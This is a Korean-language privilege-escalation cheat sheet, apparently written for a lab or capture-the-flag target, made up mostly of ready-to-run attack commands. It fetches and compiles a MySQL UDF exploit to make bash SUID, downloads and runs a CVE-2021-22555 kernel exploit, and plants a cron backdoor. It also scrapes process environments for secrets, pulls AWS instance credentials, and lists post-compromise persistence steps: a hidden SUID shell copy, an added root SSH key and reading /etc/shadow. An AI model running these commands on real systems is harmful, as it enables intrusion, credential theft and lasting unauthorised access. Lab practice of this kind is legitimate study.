# 권한 상승 비주얼 치트시트

```
┌─────────────────────────────────────────────────────────────────┐
│                    🎯 권한 상승 플로우차트                          │
└─────────────────────────────────────────────────────────────────┘

                         [START]
                            ↓
            ┌───────────────────────────┐
            │   MySQL 설정 확인          │
            │   @@secure_file_priv      │
            └───────────┬───────────────┘
                        ↓
                   ╔════╧════╗
                   ║  NULL?  ║
                   ╚════╤════╝
                        │
            ┌───────────┴───────────┐
            │                       │
          [YES]                   [NO]
            ↓                       ↓
    ┌───────────────┐      ┌──────────────┐
    │  MySQL UDF    │      │ 제한된 경로    │
    │  권한 상승     │      │ 다른 방법 시도 │
    └───────┬───────┘      └──────┬───────┘
            │                     │
            ↓                     ↓
    ┌───────────────┐      ┌──────────────┐
    │ raptor_udf2.so│      │ CVE-2021-    │
    │ 컴파일         │      │ 22555        │
    └───────┬───────┘      └──────┬───────┘
            │                     │
            ↓                     ↓
    ┌───────────────┐      ┌──────────────┐
    │ MySQL 로드    │      │ 컴파일 & 실행 │
    └───────┬───────┘      └──────┬───────┘
            │                     │
            ↓                     ↓
    ┌───────────────┐      ╔══════╧══════╗
    │ do_system()   │      ║   성공?      ║
    │ 실행          │      ╚══════╤══════╝
    └───────┬───────┘             │
            │              ┌──────┴──────┐
            ↓              │             │
      ┌─────────┐       [YES]         [NO]
      │ SUID    │         ↓             ↓
      │ bash    │    ┌────────┐   ┌──────────┐
      └────┬────┘    │ ROOT!  │   │ 대안방법  │
           │         └────────┘   └────┬─────┘
           ↓                           │
      ┌─────────┐                      ↓
      │ /bin/   │              ┌───────────────┐
      │ bash -p │              │ • Cron Jobs   │
      └────┬────┘              │ • Splunk      │
           │                   │ • Process Mem │
           ↓                   │ • SSH Keys    │
      ┌─────────┐              └───────┬───────┘
      │  ROOT!  │                      │
      └─────────┘                      ↓
                              ╔════════╧════════╗
                              ║   성공?          ║
                              ╚════════╤════════╝
                                       │
                                ┌──────┴──────┐
                                │             │
                              [YES]         [NO]
                                ↓             ↓
                           ┌────────┐   ┌──────────┐
                           │ ROOT!  │   │ 힌트요청  │
                           └────────┘   │ (그레이박스)│
                                        └────┬─────┘
                                             ↓
                                        ┌──────────┐
                                        │ MySQL    │
                                        │ root pwd │
                                        └────┬─────┘
                                             ↓
                                        ┌──────────┐
                                        │  ROOT!   │
                                        └──────────┘
```

---

## 📊 방법별 성공 확률 매트릭스

```
방법                    | 난이도 | 성공률 | 소요시간 | 전제조건
─────────────────────────────────────────────────────────────
MySQL UDF              | ⭐⭐   | 90%   | 5분     | @@secure_file_priv=NULL
MySQL root 힌트        | ⭐     | 100%  | 1분     | 그레이박스 힌트
CVE-2021-22555        | ⭐⭐⭐ | 30%   | 10분    | Kernel <5.13, unpatched
시스템 사용자 pwd 힌트  | ⭐     | 100%  | 1분     | 그레이박스 힌트
Writable Cron         | ⭐⭐   | 80%   | 1-5분   | writable cron 존재
Splunk (root)         | ⭐⭐   | 70%   | 5분     | Splunk root 실행
CVE-2022-0847         | ⭐⭐⭐ | 20%   | 15분    | Kernel 5.8-5.16
SSH Key 발견          | ⭐⭐⭐⭐| 10%  | 20분    | 읽기가능 키 존재
프로세스 메모리        | ⭐⭐⭐ | 20%   | 10분    | 비밀번호 메모리에 존재
AWS IAM               | ⭐⭐⭐ | 30%   | 5분     | IAM role 연결
PwnKit               | ⭐⭐⭐⭐| 5%    | 20분    | 특정 polkit 버전
Docker Escape        | ⭐⭐⭐ | 0%    | -       | Docker 없음 ❌
```

---

## 🎯 타임라인 기반 전략

```
0-5분:    MySQL @@secure_file_priv 확인
          └─> NULL이면 UDF 시도

5-10분:   MySQL UDF 컴파일 및 로드
          └─> 성공? ROOT! 실패? 계속

10-15분:  CVE-2021-22555 다운로드 & 컴파일
          └─> 성공? ROOT! 실패? 계속

15-20분:  Cron jobs, Splunk, SUID 체크
          └─> 발견? 악용! 없음? 계속

20-30분:  프로세스 메모리, SSH keys, AWS
          └─> 발견? 악용! 없음? 계속

30분+:    그레이박스 힌트 요청
          └─> "MySQL root 비밀번호"
          └─> ROOT!
```

---

## 💻 명령어 치트시트

### 🔍 정찰 (1분)

```bash
# 올인원 체크
echo "=== MySQL ===" && \
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;" && \
echo -e "\n=== gcc ===" && \
which gcc && gcc --version | head -1 && \
echo -e "\n=== Python ===" && \
which python3 && python3 --version && \
echo -e "\n=== Splunk ===" && \
ps aux | grep splunk | grep root && \
echo -e "\n=== Cron ===" && \
find /etc/cron* -writable 2>/dev/null
```

---

### 🚀 MySQL UDF (5분)

```bash
# 1. 다운로드 & 컴파일
cd /tmp && \
wget -q https://www.exploit-db.com/raw/1518 -O raptor_udf2.c && \
export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH" && \
gcc -g -c raptor_udf2.c -fPIC && \
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc && \
chmod 644 raptor_udf2.so && \
ls -la raptor_udf2.so

# 2. MySQL 로드
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'EOF'
CREATE TABLE IF NOT EXISTS udf_temp(line blob);
DELETE FROM udf_temp;
INSERT INTO udf_temp VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
EOF

# 3. UDF 생성 (mysql DB 접근 필요)
mysql -u webuser -p'WebPassw0rd!' mysql << 'EOF'
SELECT * FROM vulnerable_sns.udf_temp INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
EOF

# 4. Root!
/bin/bash -p
```

---

### 💥 CVE-2021-22555 (10분)

```bash
cd /tmp && \
wget -q https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O cve.c && \
gcc -o cve cve.c -static 2>&1 && \
chmod +x cve && \
./cve
```

---

### 📅 Cron Job Backdoor (1분)

```bash
# writable cron 찾기
find /etc/cron* -writable 2>/dev/null

# 있으면
echo "* * * * * root chmod u+s /bin/bash" >> /path/to/writable/cron

# 1분 대기
sleep 60 && /bin/bash -p
```

---

### 🔑 프로세스 메모리 (5분)

```bash
# 비밀번호 찾기
cd /tmp && \
for pid in /proc/[0-9]*/environ; do \
  cat "$pid" 2>/dev/null | tr '\0' '\n' | grep -i "pass\|key\|secret"; \
done | grep -v "LESSOPEN" > passwords.txt && \
cat passwords.txt | head -20
```

---

### 🌐 AWS 메타데이터 (2분)

```bash
# IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

if [ -n "$ROLE" ]; then
  curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | \
    python3 -m json.tool
fi
```

---

## 🎓 트러블슈팅 빠른 참조

```
에러                          | 해결책
─────────────────────────────────────────────────────────
cc1: not found                | export PATH="/usr/libexec/gcc/x86_64-amazon-linux/11:$PATH"
Access denied to mysql DB     | vulnerable_sns DB 사용
LOAD_FILE returns NULL        | chmod 644 /tmp/raptor_udf2.so
INTO DUMPFILE fails           | @@secure_file_priv 확인
CREATE FUNCTION fails         | .so 파일이 plugin dir에 있는지 확인
exploit: Permission denied    | chmod +x exploit
Connection refused            | AWS 보안그룹, 방화벽 확인
No such file or directory     | 절대 경로 사용
```

---

## 📋 체크리스트

```
타겟 접근:
  ✅ Reverse shell (apache user)
  ✅ Web shell (file.php?cmd=)
  ✅ MySQL access (webuser)
  ✅ gcc available
  ✅ wget available

시도할 것:
  ⬜ MySQL @@secure_file_priv 확인
  ⬜ MySQL UDF 시도
  ⬜ CVE-2021-22555 시도
  ⬜ Writable cron 확인
  ⬜ Splunk root 확인
  ⬜ 프로세스 메모리 검색
  ⬜ SSH keys 찾기
  ⬜ AWS 메타데이터 확인

실패시:
  ⬜ CRITICAL_HINTS.md 읽기
  ⬜ 그레이박스 힌트 요청:
      "MySQL root 비밀번호를 알려주세요"
  ⬜ 힌트로 권한 상승

성공시:
  ⬜ whoami 확인
  ⬜ flag 찾기
  ⬜ 백도어 설치
  ⬜ SSH 키 추가
  ⬜ AWS credentials 확인
```

---

## 🎯 결정적 힌트 (그레이박스)

```
┌─────────────────────────────────────────┐
│  "하나만 알면 다 풀리는" 정보             │
├─────────────────────────────────────────┤
│                                         │
│  1️⃣  MySQL root 비밀번호               │
│     → 즉시 UDF로 시스템 root 획득       │
│                                         │
│  2️⃣  시스템 사용자 비밀번호             │
│     → su 또는 sudo로 권한 상승          │
│                                         │
│  3️⃣  Writable cron 파일 위치           │
│     → cron job으로 SUID bash 생성       │
│                                         │
│  4️⃣  SSH private key 위치              │
│     → root 또는 다른 사용자로 SSH       │
│                                         │
│  5️⃣  작동하는 kernel exploit           │
│     → 커널 취약점으로 권한 상승         │
│                                         │
└─────────────────────────────────────────┘
```

---

## 📞 빠른 참조

```
문제                    | 문서
────────────────────────────────────────
어디서 시작?            | README_START_HERE.md
명령어가 필요?          | QUICK_COMMANDS.txt
MySQL UDF 상세?         | MYSQL_UDF_DETAILED.md
파일 전송?              | NO_NC_SOLUTION.md
막혔어요!               | CRITICAL_HINTS.md
자동화?                 | EXECUTE_NOW.sh
```

---

## 🔥 원라이너 모음

```bash
# MySQL 체크
mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;"

# MySQL UDF (컴파일된 .so 있을 때)
mysql -u webuser -p'WebPassw0rd!' mysql -e "CREATE TABLE udf(line blob); INSERT INTO udf VALUES(LOAD_FILE('/tmp/raptor_udf2.so')); SELECT * FROM udf INTO DUMPFILE '/usr/lib64/mariadb/plugin/raptor_udf2.so'; CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'; SELECT do_system('chmod u+s /bin/bash');" && /bin/bash -p

# CVE-2021-22555
cd /tmp && wget -q https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O c.c && gcc c.c -o c -static && ./c

# 전체 정찰
for i in "MySQL" "Splunk" "Cron" "Python"; do echo "=== $i ==="; done && mysql -u webuser -p'WebPassw0rd!' -e "SELECT @@secure_file_priv;" && ps aux | grep splunk | grep root && find /etc/cron* -writable 2>/dev/null && which python3
```

---

## 🎉 성공 후 할 일

```bash
# 1. 확인
whoami && id

# 2. 플래그
find / -name "*flag*" -type f 2>/dev/null | head -10
cat /root/flag.txt

# 3. 영구 접근
cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor
mkdir -p /root/.ssh && echo "ssh-rsa [키]" >> /root/.ssh/authorized_keys

# 4. AWS
cat ~/.aws/credentials
aws sts get-caller-identity

# 5. 정보 수집
cat /etc/shadow
cat /root/.bash_history
find /root -type f -name "*.txt" -o -name "*.conf" 2>/dev/null
```

---

**🚀 행운을 빕니다!**

더 자세한 내용은 각 문서를 참고하세요.
